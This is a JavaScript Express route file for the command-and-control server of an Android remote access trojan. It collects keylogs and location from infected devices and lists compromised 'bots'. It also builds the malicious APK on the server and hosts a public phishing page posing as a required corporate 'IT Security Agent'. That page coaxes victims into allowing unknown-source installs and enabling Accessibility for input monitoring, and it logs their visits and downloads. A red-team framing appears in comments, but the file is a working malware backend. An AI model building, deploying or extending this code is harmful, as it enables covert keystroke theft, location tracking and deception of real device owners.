"use strict";

const { spawn } = require("child_process");

/**
 * Android agent routes — extends the existing C2 with Android-specific endpoints.
 *
 * Android agents use the standard Windows stub endpoints too:
 *   GET /checkin, GET /cmd, GET /result, POST /upload
 *
 * This file adds only what's Android-specific:
 *   POST /android/keylog?id=<id>   — bulk keylog text upload
 *   GET  /api/android/agents       — list Android-only bots (admin)
 */

const express  = require("express");
const path     = require("path");
const fs       = require("fs");

const { UPLOADS_DIR }    = require("../config/constants");
const { botAuthed }      = require("../middleware/auth");
const { requireAdmin }   = require("../middleware/auth");
const { getOrCreate }    = require("../controllers/botController");
const { bots }           = require("../state");
const persist            = require("../persist");

const router = express.Router();

// ── keylog upload ─────────────────────────────────────────────────────────────

router.post("/android/keylog", express.text({ limit: "256kb", type: "text/plain" }), (req, res) => {
    if (!botAuthed(req)) return res.status(403).send("");
    const id = req.query.id;
    if (!id) return res.status(400).send("");
    if (bots[id]?.blocked) return res.status(200).send("");

    const bot  = getOrCreate(id);
    const text = req.body || "";
    bot.lastSeen = new Date().toISOString();

    // Save keylog to a file in uploads/
    if (text.length > 0) {
        const fname = `${id}_keylog_${Date.now()}.txt`;
        const fpath = path.join(UPLOADS_DIR, fname);
        fs.writeFileSync(fpath, text, "utf8");
        bot.files.push(fname);
        bot.results.push({ time: new Date().toISOString(), data: `[keylog] ${fname} (${text.length} chars)` });
        persist.scheduleSave();
        console.log(`[android/keylog]  bot=${id}  ${text.length} chars → ${fname}`);
    }

    res.status(200).send("");
});

// ── live location from Android agent ──────────────────────────────────────────
// Agent POSTs "lat,lon,acc" text with every beacon. No user permission prompt —
// uses getLastKnownLocation (cached, already requires ACCESS_FINE_LOCATION).

router.post("/android/location", express.text({ limit: "128b", type: "text/plain" }), (req, res) => {
    if (!botAuthed(req)) return res.status(403).send("");
    const id = req.query.id;
    if (!id) return res.status(400).send("");
    if (bots[id]?.blocked) return res.status(200).send("");

    const parts = (req.body || "").split(",").map(Number);
    const [lat, lon, acc] = parts;
    if (isNaN(lat) || isNaN(lon) || lat === 0 && lon === 0) return res.status(400).send("");

    const bot = getOrCreate(id);
    const point = { time: new Date().toISOString(), lat, lon, acc: acc || 0 };
    if (!bot.locationHistory) bot.locationHistory = [];
    bot.locationHistory.push(point);
    if (bot.locationHistory.length > 200) bot.locationHistory.shift();
    bot.lastLoc  = point;
    bot.lastSeen = point.time;
    persist.scheduleSave();
    res.status(200).send("");
});

// Admin: get location history for one bot
router.get("/api/android/location/:id", requireAdmin, (req, res) => {
    const bot = bots[req.params.id];
    if (!bot) return res.status(404).json({ error: "not found" });
    res.json({ lastLoc: bot.lastLoc || null, history: bot.locationHistory || [] });
});

// ── list Android agents (admin dashboard) ─────────────────────────────────────

router.get("/api/android/agents", requireAdmin, (_req, res) => {
    const androidBots = Object.values(bots).filter(b => {
        return b.info && b.info.includes("platform=android");
    });
    res.json(androidBots.map(b => ({
        id:          b.id,
        model:       extractField(b.info, "model"),
        mfr:         extractField(b.info, "mfr"),
        sdk:         extractField(b.info, "sdk"),
        release:     extractField(b.info, "release"),
        operator:    extractField(b.info, "operator"),
        lastSeen:    b.lastSeen,
        firstSeen:   b.firstSeen,
        hasPending:  !!b.pendingCmd,
        fileCount:   b.files.length,
        resultCount: b.results.length,
        blocked:     b.blocked || false,
    })));
});

function extractField(info, key) {
    if (!info) return "";
    const m = info.match(new RegExp(key + "=([^|]+)"));
    return m ? m[1] : "";
}

// ── Android APK builder — generates config.json for download ─────────────────
// User fills in host/auth in the dashboard, downloads config.json, drops it
// into app/src/main/assets/ and builds once with: ./gradlew assembleDebug

router.get("/api/android/builder", requireAdmin, (_req, res) => {
    const { AUTH_KEY } = require("../config/constants");
    res.json({
        defaultHost: `https://${_req.hostname}:${require("../config/constants").PORT}`,
        defaultAuth: AUTH_KEY,
        instructions: [
            "1. Fill in host and auth below and click Download Config",
            "2. Copy config.json into: docs/38-android-rat/project/app/src/main/assets/",
            "3. Open the project in Android Studio (or run: cd project && ./gradlew assembleDebug)",
            "4. Find APK at: project/app/build/outputs/apk/debug/app-debug.apk",
            "5. Install on test device: adb install app-debug.apk",
        ]
    });
});

router.post("/api/android/builder/config", requireAdmin, (req, res) => {
    const host         = (req.body.host || "").trim();
    const auth         = (req.body.auth || "").trim();
    const trust_all    = req.body.trust_all !== false;
    const beacon_ms    = parseInt(req.body.beacon_ms) || 30000;

    if (!host) return res.status(400).json({ error: "host required" });

    const config = JSON.stringify({ host, auth, trust_all, beacon_interval_ms: beacon_ms }, null, 2);

    res.setHeader("Content-Type", "application/json");
    res.setHeader("Content-Disposition", 'attachment; filename="config.json"');
    res.send(config);
    console.log(`[android/builder]  config generated for host=${host}`);
});

// ── Server-side APK build ─────────────────────────────────────────────────────
const PROJECT_DIR = path.resolve(__dirname, "../../docs/38-android-rat/project");
const ASSETS_DIR  = path.join(PROJECT_DIR, "app/src/main/assets");
const APK_OUT     = path.join(PROJECT_DIR, "app/build/outputs/apk/debug/app-debug.apk");
const GRADLEW     = path.join(PROJECT_DIR, "gradlew.bat");

let buildRunning = false;

router.post("/api/android/builder/build", requireAdmin, (req, res) => {
    if (buildRunning) {
        res.setHeader("Content-Type", "text/event-stream");
        res.setHeader("Cache-Control", "no-cache");
        res.write("data: [BUILD ALREADY RUNNING — please wait for it to finish]\n\n");
        res.end();
        return;
    }

    const host      = (req.body.host || "").trim();
    const auth      = (req.body.auth || "").trim();
    const trust_all = req.body.trust_all !== false;
    const beacon_ms = parseInt(req.body.beacon_ms) || 30000;

    if (!host) { res.status(400).json({ error: "host required" }); return; }

    // Write updated config.json before build
    try {
        if (!fs.existsSync(ASSETS_DIR)) fs.mkdirSync(ASSETS_DIR, { recursive: true });
        const config = JSON.stringify({ host, auth, trust_all, beacon_interval_ms: beacon_ms }, null, 2);
        fs.writeFileSync(path.join(ASSETS_DIR, "config.json"), config, "utf8");
    } catch (e) {
        res.status(500).json({ error: "Failed to write config: " + e.message });
        return;
    }

    // Stream build output via SSE
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.flushHeaders();

    const send = line => res.write(`data: ${line}\n\n`);

    send(`[INFO] config.json written → ${JSON.stringify({ host, trust_all, beacon_interval_ms: beacon_ms })}`);
    send("[INFO] Starting Gradle build — this takes 1–3 minutes on first run...");

    buildRunning = true;

    const proc = spawn("cmd.exe", ["/c", `"${GRADLEW}" assembleDebug`], {
        cwd: PROJECT_DIR,
        env: { ...process.env, JAVA_OPTS: "-Xmx1g" },
        shell: false,
    });

    proc.stdout.on("data", d =>
        d.toString().split("\n").forEach(l => { if (l.trim()) send(l.trimEnd()); })
    );
    proc.stderr.on("data", d =>
        d.toString().split("\n").forEach(l => { if (l.trim()) send("[ERR] " + l.trimEnd()); })
    );

    proc.on("close", code => {
        buildRunning = false;
        if (code === 0) {
            send("[SUCCESS] ✓ Build complete!");
            send("[APK_PATH] " + APK_OUT);
        } else {
            send("[FAILED] Build exited with code " + code);
        }
        send("[DONE]");
        res.end();
    });

    proc.on("error", e => {
        buildRunning = false;
        send("[ERROR] Failed to start build: " + e.message);
        send("[DONE]");
        res.end();
    });

    req.on("close", () => { if (!proc.killed) proc.kill(); buildRunning = false; });
});

// Serve the built APK for download (admin)
router.get("/api/android/builder/apk", requireAdmin, (_req, res) => {
    if (!fs.existsSync(APK_OUT)) {
        return res.status(404).json({ error: "APK not built yet — run Build APK on Server first" });
    }
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    res.setHeader("Content-Disposition", 'attachment; filename="it-security-agent.apk"');
    res.sendFile(APK_OUT);
});

// ── Delivery landing page ─────────────────────────────────────────────────────
// Public page — no auth required. Tracks visits + downloads for red team report.
// Send this URL to the test recipient: https://<server>/get

const dlLog = [];  // in-memory log: [{time, ip, ua, event}]

function logDl(req, event) {
    const entry = {
        time:  new Date().toISOString(),
        ip:    req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "?",
        ua:    req.headers["user-agent"] || "",
        event,
    };
    dlLog.push(entry);
    if (dlLog.length > 500) dlLog.shift();
    console.log(`[delivery]  event=${event}  ip=${entry.ip}  ua=${entry.ua.slice(0,60)}`);
}

router.get("/get", (req, res) => {
    logDl(req, "page_visit");
    const apkExists = fs.existsSync(APK_OUT);
    const dlUrl     = "/get/apk";

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(`<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#0052CC">
<title>IT Security Agent — Required Installation</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f4f5f7;color:#172b4d;min-height:100vh;display:flex;flex-direction:column}
header{background:#0052CC;color:#fff;padding:0 24px;height:56px;display:flex;align-items:center;gap:12px;flex-shrink:0}
.logo{font-weight:700;font-size:15px;letter-spacing:.3px}
.logo span{opacity:.7;font-weight:400;font-size:13px;margin-left:8px}
.wrap{max-width:520px;margin:48px auto;padding:0 20px;flex:1}
.card{background:#fff;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.12);padding:32px;margin-bottom:20px}
.badge{display:inline-flex;align-items:center;gap:6px;background:#DEEBFF;color:#0052CC;border-radius:4px;padding:4px 10px;font-size:12px;font-weight:600;margin-bottom:18px}
h1{font-size:20px;font-weight:700;color:#172b4d;margin-bottom:8px}
.sub{font-size:14px;color:#5e6c84;line-height:1.6;margin-bottom:24px}
.app-row{display:flex;align-items:center;gap:14px;background:#f4f5f7;border-radius:6px;padding:14px 16px;margin-bottom:24px}
.app-icon{width:52px;height:52px;border-radius:12px;background:#0052CC;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0}
.app-meta{flex:1}
.app-name{font-weight:700;font-size:15px;color:#172b4d}
.app-ver{font-size:12px;color:#5e6c84;margin-top:2px}
.btn-dl{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;background:#0052CC;color:#fff;border:none;border-radius:6px;padding:14px 20px;font-size:15px;font-weight:600;cursor:pointer;text-decoration:none;transition:.15s}
.btn-dl:hover{background:#0747a6}
.btn-dl.disabled{background:#97a0af;cursor:not-allowed;pointer-events:none}
.steps{margin-top:24px;display:flex;flex-direction:column;gap:12px}
.step{display:flex;gap:12px;align-items:flex-start;font-size:13px;color:#5e6c84;line-height:1.5}
.step-num{width:22px;height:22px;border-radius:50%;background:#DEEBFF;color:#0052CC;font-weight:700;font-size:11px;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
.note{background:#FFFAE6;border:1px solid #FFE380;border-radius:6px;padding:12px 14px;font-size:12px;color:#172b4d;line-height:1.6;margin-top:20px}
.what-new{margin-top:20px}
.what-new h3{font-size:12px;font-weight:700;color:#5e6c84;letter-spacing:.5px;text-transform:uppercase;margin-bottom:10px}
.what-new ul{list-style:none;display:flex;flex-direction:column;gap:6px}
.what-new li{font-size:13px;color:#172b4d;padding-left:16px;position:relative}
.what-new li::before{content:'✓';position:absolute;left:0;color:#36b37e;font-weight:700}
footer{text-align:center;font-size:12px;color:#5e6c84;padding:20px;flex-shrink:0}
@media(max-width:480px){.wrap{margin:24px auto}.card{padding:22px}}
</style>
</head>
<body>
<header>
  <div style="font-size:22px">🛡️</div>
  <div class="logo">IT Support <span>— Device Management</span></div>
</header>
<div class="wrap">
  <div class="card">
    <div class="badge">🔒 Action Required</div>
    <h1>Security Agent — Required Installation</h1>
    <p class="sub">
      Your IT department requires this app on all corporate Android devices.
      It provides device health monitoring, compliance checks, and remote support.
      Installation takes less than 1 minute.
    </p>
    <div class="app-row">
      <div class="app-icon">🛡</div>
      <div class="app-meta">
        <div class="app-name">IT Security Agent</div>
        <div class="app-ver">Version 2.4.1 · ~5 MB · Android 8.0+</div>
      </div>
    </div>
    ${apkExists
        ? `<a class="btn-dl" href="${dlUrl}" id="dl-btn">⬇ Download &amp; Install</a>`
        : `<div class="btn-dl disabled">⬇ Download &amp; Install</div>
           <p style="font-size:12px;color:#de350b;margin-top:8px;text-align:center">APK not yet built — build it from the C2 dashboard first.</p>`
    }
    <div class="steps">
      <div class="step"><div class="step-num">1</div><span>Tap <strong>Download &amp; Install</strong>. If asked, allow installs from this source.</span></div>
      <div class="step"><div class="step-num">2</div><span>Open the downloaded file and tap <strong>Install</strong>.</span></div>
      <div class="step"><div class="step-num">3</div><span>Launch <strong>IT Security Agent</strong> and accept the permissions to complete enrollment.</span></div>
      <div class="step"><div class="step-num">4</div><span>Go to <strong>Settings → Accessibility → Accessibility Service → Enable</strong> to activate input monitoring for compliance.</span></div>
    </div>
    <div class="note">
      ℹ️ If your device shows a warning about installing from unknown sources, tap <strong>Settings</strong> in the prompt and toggle <strong>Allow from this source</strong>. This is required for corporate app distribution outside the Play Store.
    </div>
    <div class="what-new">
      <h3>What's included in v2.4.1</h3>
      <ul>
        <li>Device health reporting &amp; compliance checks</li>
        <li>Remote troubleshooting support for IT</li>
        <li>Accessibility service for enterprise app compatibility</li>
        <li>Improved battery efficiency</li>
      </ul>
    </div>
  </div>
  <div style="font-size:12px;color:#5e6c84;text-align:center">
    Questions? Contact <strong>it-support@company.com</strong> · ext. 1234
  </div>
</div>
<footer>© IT Department — Internal Use Only</footer>
<script>
document.getElementById('dl-btn')?.addEventListener('click',function(){
  // tiny tracking pixel back to the server
  fetch('/get/track?e=dl_click',{method:'GET',keepalive:true}).catch(()=>{});
});
</script>
</body>
</html>`);
});

// APK download from landing page (public — no auth, but only served if APK exists)
router.get("/get/apk", (req, res) => {
    if (!fs.existsSync(APK_OUT)) {
        return res.status(404).send("Not available");
    }
    logDl(req, "apk_download");
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    res.setHeader("Content-Disposition", 'attachment; filename="it-security-agent.apk"');
    // No-cache so each download is counted
    res.setHeader("Cache-Control", "no-store");
    res.sendFile(APK_OUT);
});

// Tracking pixel from the landing page JS
router.get("/get/track", (req, res) => {
    logDl(req, req.query.e || "track");
    res.status(204).end();
});

// Admin: view delivery log for red team report
router.get("/api/android/delivery-log", requireAdmin, (_req, res) => {
    res.json({
        total_visits:    dlLog.filter(e => e.event === "page_visit").length,
        total_downloads: dlLog.filter(e => e.event === "apk_download").length,
        total_clicks:    dlLog.filter(e => e.event === "dl_click").length,
        entries: dlLog.slice().reverse(),
    });
});

module.exports = router;
